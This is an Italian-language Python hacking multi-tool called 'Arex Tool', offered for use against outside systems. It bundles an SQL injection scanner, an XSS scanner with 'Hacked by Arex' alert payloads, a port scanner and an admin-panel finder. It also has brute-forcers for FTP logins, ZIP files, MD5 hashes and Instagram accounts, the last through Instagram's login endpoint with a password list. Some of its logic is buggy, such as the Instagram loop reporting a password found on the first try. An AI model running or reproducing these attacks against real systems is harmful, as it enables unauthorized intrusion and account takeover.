# Coded  by  Arex  &  Erebo & M0nk3y

try:
    import socket, os, requests, re, zipfile, hashlib, json, time, sys, ftplib, itertools, string, platform
except:
    print("\n Errore, moduli non installati [ ! ]")

header = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1"

def banner():
    ip = requests.get("http://myexternalip.com/raw").text
    print("""
 _____                _____         _
|  _  |___ ___ _ _   |_   _|___ ___| |
|     |  _| -_|_'_|    | | | . | . | |
|__|__|_| |___|_,_|    |_| |___|___|_|

 <! Coded By Godlik, Erebo, M0nkey !>

 !     Attenzione!
 >     Gli sviluppatori non si assumono nessuna responsabilita\' legale.
 >     Ricordiamo che la violazione di sistemi privati e' un atto punibile legalmente.
""")

# -------------------------
# Semplice   SQLi   Scanner
# -------------------------

def sqlscan(host):
    print("Sto Scannerizzando: %s" %(host))
    sl = re.search(r'([\w:/\._-]+\?[\w_-]+=)([\w_-]+)', host)
    #inject = url + "'"
    url = host
    errori = ["mysql_num_rows()", "mysql_fetch_array()", "Error Occurred While Processing Request", "Server Error in '/' Application", "Microsoft OLE DB Provider for ODBC Drivers error", "error in your SQL syntax", "Invalid Querystring","OLE DB Provider for ODBC",
        "VBScript Runtime", "ADODB.Field", "BOF or EOF", "ADODB.Command", "JET Database", "mysql_fetch_row()","Syntax error", "include()", "mysql_fetch_assoc()", "mysql_fetch_object()", "mysql_numrows()",
         "GetArray()", "FetchRow()","Input string was not in a correct format", "session_start()", "array_merge()", "preg_match()", "ilesize()", "filesize() ", "SQL Error", "[MySQL][ODBC 5.1 Driver][mysqld-4.1.22-community-nt-log]You have an error in your SQL syntax",
         "You have an error in your SQL syntax", "mysql_query()", "mysql_fetch_object()", "Query failed:", "Warning include() [function.include]", "mysql_num_rows()", "Database Query Failed", "mysql_fetch_assoc()", "mysql_free_result()", "Query failed (SELECT * FROM WHERE id = )", "num_rows", "Error Executing Database Query",
         "Unclosed quotation mark", "Error Occured While Processing Request", "FetchRows()", "Microsoft JET Database", "ODBC Microsoft Access Driver", "OLE DB Provider for SQL Server", "SQLServer JDBC Driver","Error Executing Database Query", "ORA-01756", "getimagesize()", "unknown()", "mysql_result()", "pg_exec()", "require()","Microsoft JET Database",
         "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider", "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript", "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle", "Active Server Pages error", "OLE/DB provider returned message", "OLE DB Provider for ODBC",
         "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_","ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended","DB2 ODBC", "DB2 error", "DB2 Driver","ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver","Warning: pg_", "PostgreSql Error:", "function.pg", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", ": pg_","Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "sybase_", "ODBC Driver","java.sql.SQLSyntaxErrorException: ORA-", "org.springframework.jdbc.BadSqlGrammarException:", "javax.servlet.ServletException:", "java.lang.NullPointerException","Error Executing Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver","java.io.IOException: InfinityDB","Warning: include", "Fatal error: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include","Disallowed Parent Path", "function.require", "Warning: main", "Warning: session_start\(\)", "Warning: getimagesize\(\)", "Warning: array_merge\(\)", "Warning: preg_match\(\)","GetArray\(\)", "FetchRow\(\)", "Warning: preg_", "Warning: ociexecute\(\)", "Warning: ocifetchstatement\(\)", "PHP Warning:","Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF","Unclosed quotation mark", "Error converting data type varchar to numeric","LuaPlayer ERROR:", "CGILua message", "Lua error","Incorrect syntax near", "Fatal error", "Invalid Querystring", "Input string was not in a correct format"]

    url_ = url + "'"
    status = False
    r = requests.get(url_)
    tentativi = 0
    if r.status_code == 200:
        status = True
        print(" + Trovata Possibile Vulnerabilita'")
        time.sleep(0.5)
        print(" * Analizzo la Query")
        for error in errori:
            tentativi += 1
            status_ = False
            inject = host + error
            req = requests.get(inject)
            html = req.text
            if error in html:
                status_ = True
                print ("\n + SQL Injcetion! >>> %s \n + Error                         >>> '%s'" %(url, error))
                #print("\nVulnerabile: "  + host + "\nTipo di Errore: '" + error + "'")
                break
            else:
                print("Testing Payload ... [%s] >  %s" %(tentativi, error))
                #sys.stderr.flush()
    if not status:
        print("\n - Non online! >>> %s" %(url))
    elif status and not status_:
        print("\n - Trovata possibile Falla, ma il Sito non Restituisce Errori evidenti \n>>> %s" %(url))
    main()

# -------------------------
# Semplice Scanner di Porte
# -------------------------

def portscan(host):
    portlist = [20, 21, 22, 23, 25, 80, 443, 445, 3389, 8080]
    print("Sto Scannerizzando: %s" %(host))
    print("\n  Stato\t\tPorta\t\tConnessione")
    print("-------\t\t-----\t\t-----------\n")
    for port in portlist:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((host, port)) == 0:
            print("+ Aperta\t%s\t\t[OK]" %(str(port)))
        else:
            print("- Chiusa\t%s\t\t-" %(str(port)))
# -------------------------
# Trova  Pannello di  Admin
# -------------------------

def paneladminf(host):
    lista = ["/admin", "/adm", "/administrador", "/administrator", "/admin/login.php", "/admin_login", "/cgi-local/", "/sys/admin/", "/cpanel", "/adm/login.php", "/cgi/admin/", "/login.php", "/login", "/user", "/admincontrol/login.php", "/administratorlogin.php", "/adm/index.php", "/home.php", "/user.html",
    "/login.html", "/administrator/", "/admin/", "/webadmin/", "/adminarea/", "/admin/account.php", "/admin/index.php", "/siteadmin/login.php", "/siteadmin/index.php", "/admin/index.html", "/admin/login.html", "/admin/account.html", "/admin/login.html", "/admin/admin.html", "/admin/home.php", "/adminpanel.html", "/webadmin.html", "/admin_login.php", "/account.php", "/adminpanel.php", "/user.html",
    "/user.php", "/adm.html", "/adm/index.html", "/admincontrol/login.html", "/home.php", "/admin.php", "/admin2.php", "/adm/index.php", "/affiliate.php", "/adm.php", "/memberadmin.php", "/administratorlogin.php", "/adminLogin.php", "/panel-administracion/index.php", "/usuarios/login.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/panel-administracion/", "/bb-admin/", "/usuarios/",
    "/usuario/", "/admin1/", "/admin2/", "/siteadmin/login.html", "/siteadmin/login.php", "/siteadmin/index.php", "/admin/account.php", "/admin/account.html",
    ]
    print("Sto Scannerizzando: %s" %(host))
    try:
        for i in lista:
            url = host + i
            r = requests.get(url)
            if r.status_code == 200:
                print ("\n[?] Possibile Pagina Trovata >>> " + url + " > " + i + "\n")
            else:
                pass
                print(">>> Pagina non Trovata: " + url + " > " + i)
    except requests.exceptions.ConnectionError:
        print("[!] Scan interrotto, le richieste vengono bloccate!")
    main()

# -------------------------
# Scanner Vulnerabilità Xss
# -------------------------

def xssscan(host):
    url = host
    if url[:4] != "http":
        url = "http://" + url
    # estens = ["/product.php?id=", "/product.php?cat=", "/*.php?ProductId=", "/login"]
    payload = ['"""><script>alert("Hacked by Arex");</script>', '<script>alert(123);</script>',
               '<ScRipT>alert("XSS");</ScRipT>', '<script>alert(123)</script>',
               '=%22%22%22%3E%3Cscript%3Ealert%28%22Hacked+by+Arex%22%29%3B%3C%2Fscript%3E']
    time_ = time.strftime("%H:%M:%S")
    print("\n [*] Start Scanning [%s]: %s\n" % (time_, url))
    sl = re.search(r'([\w:/\._-]+\?[\w_-]+=)([\w_-]+)', url)
    r = requests.get(url)
    xss = ''
    urlinject = url + "'"
    status = False
    r = requests.get(urlinject)
    tentativi = 0
    print(" [+] Analizing Vulnerabilities")
    if r.status_code == 200:
        status = True
        time.sleep(0.5)
        print(" [*] Analizing Query")
        for payload in payload:
            urlpayload = url + payload
            req = requests.get(urlpayload)
            html = req.text
            if str(payload) in html:
                xss = True
                # print(html)
                time_ = time.strftime("%H:%M:%S")
                print ("\n [+] XSS Injcetion! [%s] > %s \n [+] Payload > '%s'" %
                       (time_, url, str(payload)))
                break

            else:
                xss = False
                pass
        if not xss:
            time_ = time.strftime("%H:%M:%S")
            print(
                    "\n [-] Trovata possibile Falla, "
                    "ma il Sito non Restituisce Errori evidenti \n[%s] > %s" % (time_, url))

                

# -------------------------
#  Server's  sites   Finder
# -------------------------

def dorkgen(server):
    #lista = []
    pagine = 1
    while pagine <= 150:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + server + "+&count=50&first=" + str(pagine)
            openbing = requests.get(bing)
            readbing = openbing.text
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                siti = findwebs[i]
                time.sleep(0.10)
                print(" + Sito Trovato ---> " + siti)
            pagine += 50
        except Exception as e:
            print(e)
    print("\n--------------\nScan Terminato")

    main()


# -------------------------
#   Zip   File   Bruteforce
# -------------------------

def Wordlist(minimo, massimo):
    minimo = int(minimo)
    massimo = int(massimo)
    create = open('wordlist.txt', 'w')
    chrs = string.printable.replace(' \t\n\r\x0b\x0c', '')
    print ("- Creo il File Wordlist in: { wordlist.txt }")
    print ("- Perfavore Aspetta...")

    for n in range(minimo, massimo+1):
        for xs in itertools.product(chrs, repeat=n):
            saved = ''.join(xs)
            create.write("%s\n" % saved)
    create.close()

def creawrdl(zipFile, wordList):
    password = None
    tentativi = 0
    zipFile = zipfile.ZipFile(zipFile)
    print("======================================")
    with open(wordList, 'r') as f:
        for line in f.readlines():
            tentativi += 1
            password = line.strip('\n')

            try:
                zipFile.extractall(pwd = password.encode('cp850','replace'))
                print ("\n\n======================================\n[+] Password Trovata: { %s }" % password)
                break
                main()
            except RuntimeError:
                sys.stderr.write("\r" "Cracking ... [%s] >\t%s" %(tentativi, password) )
                sys.stderr.flush()
    main()

# -------------------------
#   FTP  Bruteforce  Attack
# -------------------------

def attacco(host, passfile, username):
    passfile = str(passfile)
    passfile = open(passfile, 'r')
    print("Attacco iniziato verso: %s\n" %(host))
    for password in passfile.readlines():
        password = password.strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user=username, passwd=password)
            password = str(password)
            rint("\n--------------------------------------------------------\n[Non Trovato]\t  Username: %s\tPassword: %s" %(username, password))
        except socket.gaierror:
            print("Host non valido")
        except ftplib.error_perm:
            print("[Non Trovato]\t  Username: %s\tPassword: %s" %(username, password))
        except KeyboardInterrupt:
            print("\nInterrompo l' Attacco...\n")
            break
    main()

def ftpbrute():
    #tipo = input("\nTipo di bruteforce:\n[1] Bruteforce\n[2] Dizionario\n\n>>>")
    #if tipo == "B":
        #host = input("\nHost >> ")
        #username = input("Username >> ")
        #minimo = input("\n- Inserisci la Lunghezza  Minima: ")
        #massimo = input("- Inserisci la Lunghezza Massima: ")
        #wordList = 'wordlist.txt'
        #Wordlist(minimo, massimo, host, username)

    #elif tipo == "D":
    print("\n- Inserisci l'host da attaccare\n[www.mic-w.com]")
    host = input("\n>> ")
    username = input("Username >> ")
    passFile = input("Password list file >> ")
    attacco(host, passFile, username)

# -------------------------
# Md5 Decrypter (Bruteforce)
# -------------------------

def md5():
    mdhash = input("\n- Inserisci il hash Md5:\n>> ")
    lista = input("\n- Inserisci percorso lista:\n>> ")
    time.sleep(1)
    print("+ Attendere ...\n")
    time.sleep(1)
    tentativi = 0
    try:
        lista = open(lista, 'r')
    except ValueError:
        exit
    for passw in lista:
        #b = bytes
        tentativi += 1
        passw = passw.encode('utf-8')
        filep = hashlib.md5(passw.strip()).hexdigest()
        passw = passw.decode('ascii').strip()
        print("Sto Provando ... [%s] >\t%s" %(tentativi, passw))
        if mdhash == filep:
            print("\nCorrispondenza Trovata: [%s] >\t%s" %(tentativi, passw))
            break
        else:
            pass

#-------------------------
# Thanks To @erebohpg6 for
# this Funcion!
#-------------------------

def Login(username, password):
    sess = requests.Session()
    sess.cookies.update({'sessionid' : " ", "mid" : " ", "ig_pr" : "1", "ig_vw" : '1920', 'csrftoken' : " ",  's_network' : " ", 'ds_user_id' : " "})
    sess.headers.update({
                    'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                    'x-instagram-ajax':'1',
                    'X-Requested-With': 'XMLHttpRequest',
                    'origin': 'https://www.instagram.com',
                    'ContentType' : 'application/x-www-form-urlencoded',
                    'Connection': 'keep-alive',
                    'Accept': '*/*',
                    'Referer': 'https://www.instagram.com',
                    'authority': 'www.instagram.com',
                    'Host' : 'www.instagram.com',
                    'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
                    'Accept-Encoding' : 'gzip, deflate'
    })

    r = sess.get('https://www.instagram.com/')
    sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

    data = {'username':username, 'password':password}
    r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
    token = r.cookies.get_dict()['csrftoken']
    sess.headers.update({'X-CSRFToken' : token})
    data = json.loads(r.text)
    if (data['status'] == 'fail'):
        return False
    if (data['authenticated'] == True):
        return True
def usersExists(users):
    i = 0
    for username in users:
        r = requests.get("https://www.instagram.com/%s/?__a=1" %(username))
        if r.status_code == 404:
            i = 1
            print("[!] Username non esistenti!")
        if r.status_code == 200:
            #print(">> " + username + " esistente.")
            return i
def insta():
    ip = requests.get("http://myexternalip.com/raw").text
    print(">> Ip attuale: " + ip[0:-1])
    print(">> Usa sempre un proxy di sistema [!]\n")
    #username_file = input(">> Inserisci il percorso del file con gli username: ")
    username = input("Username: ")
    print("* Verifico l'esistenza di " + str(len(username)))
    result = usersExists(username)
    #if result == 1:
        #print("+ Inserire nel file " + username_file + " solo username esistenti!")
        #sys.exit()
    password_file = input(">> Inserisci il percorso del file con le password: ")
    with open(password_file, "r") as f:
        password_lista = f.readlines()
    print("* Password totali: " + str(len(password_file)) + ".")
    for _ in range(0, len(password_lista)):
        password_lista[_] = password_lista[_][0:-1]
    delay = int(input(">> Inserisci il delay: "))
    n = 0
    for password in password_lista:
        #for username in username:
            #if len(password) > 5:
        n += 1

        #try:#login = Login(username, password)
        Login(username, password)
        print("\n%s < > Found ! > [%s] Password: %s " %(username, str(n), password))
        break

                #with open(".logs", "a") as f:
                    #f.write(username + ":" + password + "\n")
        print("Testing: %s > [%s] Password: %s " %(username, str(n), password))
        time.sleep(delay)
        #except Exception as e:
            #print(".")


opzioni = """\nOptions and Commands:

 <Scanners>
        sql.scan         sql injection Scanner
        xss.scan         xss injection Scanner
        port.scan        port Scanner

 <Bruteforce>
        zip.brute        zip file Bruteforcer
        ftp.brute        ftp login Bruteforcer
        insta.brute      instagram Bruteforcer

 <Sites>
        admin.finder     panel admin Finder
        server.sites     server's site Finder

 <Others>
        dork.prs         costum dorks Maker
        md5.decrypt      md5 hash Decrypter

 <Commands>
        clear            clear screen
        exit             exit
 """

def main():
    sc = input("\n[Arex] > ")

    if sc == "sql.scan":
        try:

            print("\n====================================\nSql Injection Vulnerability Scanner\n====================================")
                #sn = input("\n[1] Scan Singolo\n[2] Scan Multiplo\n>>")
                #if sn == "1":
            host = input("\nEnter the Url [http://.../...?id=] >> ")
                #elif sn == "2":
                    #diz = input("")
                #else:
                    #print("Errore, Argomento non Valido")
            sqlscan(host)
        except requests.exceptions.MissingSchema:
            print("Invalid Url. Remember to use 'http://'")
        main()
    elif sc == "help":
        print(opzioni)
        main()

    elif sc == "xss.scan":
        try:
            print("\n====================================\nXSS Injection Vulnerability Scanner\n====================================")
            host = input("\nEnter the Url [http://.../search.php?key=] >> ")
            xssscan(host)
        except requests.exceptions.MissingSchema:
            print("Invalid Url. Remember to use 'http://'")
        main()
    elif sc == "port.scan":
        try:
            print("\n====================\nOpen  Ports  Scanner\n====================")
            host = input("\nEnter the host [www.example.com] >> ")
            portscan(host)
        except socket.gaierror:
                print("Invalid Url. Remember to DON'T use 'http://'")
        main()
    elif sc == "admin.finder":
        print("\n=======================\nPanel Admin Finder Tool\n=======================")
        host = input("\nEnter the Url [http://example.com] >> ")
        paneladminf(host)
        main()
    elif sc == "zip.brute":
        print("\n====================\nFile Zip Bruteforcer\n====================")

# -------------------------
#   Zip   File   Bruteforce
# -------------------------
        print ("Scegli una di queste Opzioni:\n[1] Bruteforce Puro\n[2] Bruteforce con Wordlist File.")
        sc_e = input(">> ")
        if sc_e == '1':
            zipFile = input("\n- Inserisci il percorso del file Zip: ")
            minimo = input("\n- Inserisci la Lunghezza  Minima: ")
            massimo = input("- Inserisci la Lunghezza Massima: ")
            wordList = 'wordlist.txt'
            if minimo > massimo:
                print ("[!] Ops, Errore..!! la Lunghezza minima deve essere uguale o minore alla Lunghezza massima.")
                sys.exit()
            else:
                pass
            Wordlist(minimo, massimo)
            creawrdl(zipFile, wordList)

        elif sc_e == '2':
            zipFile = input("- Inserisci il percorso del file Zip: ")
            wordList = input("- Inserisci il percorso del file Wordlist: ")
            creawrdl(zipFile, wordList)
        main()


    elif sc == "server.sites":
        print("\n===================\nServer Sites Finder\n===================\n")
        server = input("\nServer's IP >> ")
        dorkgen(server)

    elif sc == "7":
        print("=========================================================")
        print("Lavori in corso, Costum Dorks sarà disponibile\nin seguito [!]")
        main()

    elif sc == "ftp.brute":
        print("\n================\nFTP Bruteforcer\n================")
        ftpbrute()
        main()

    elif sc == "md5.decrypt":
        print("\n====================\nMD5 Hash Decrypter\n====================")
        md5()
        main()

    elif sc == "insta.brute":
        insta()
        main()


    elif sc == "exit":
        print("\n! Quitting ...")
        exit

    elif sc == "clear":
        if platform.system() == "Windows":
            os.system("cls")
        elif platform.system() == "Linux":
            os.system("clear")
        banner()
        main()

    else:
        print("Error, Command not recognised!")
        main()

if __name__ == '__main__':
    banner()
    main()
